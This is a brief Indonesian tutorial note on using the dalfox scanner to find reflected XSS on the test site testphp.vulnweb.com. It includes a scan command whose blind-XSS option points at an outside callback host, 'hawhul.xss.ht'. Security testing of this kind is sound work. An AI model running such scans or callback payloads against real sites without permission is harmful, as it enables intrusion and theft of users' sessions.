# dalfox
Tool ini digunakan untuk menemukan kerentanan XSS Reflected pada suatu URL di website

- Link download dan instalasi: https://github.com/hahwul/dalfox

## Pengujian pada website http://testphp.vulnweb.com/
- Gunakan tool Paramspider terlebih dahulu untuk mengumpulkan daftar URL yang bisa digunakan untuk pengujian XSS Reflected
```sh
dalfox file results/testphp.vulnweb.com.txt -b hawhul.xss.ht
```
- Akses tiap URL yang mengandung payload di browser untuk mengecek kerentanan XSS Reflected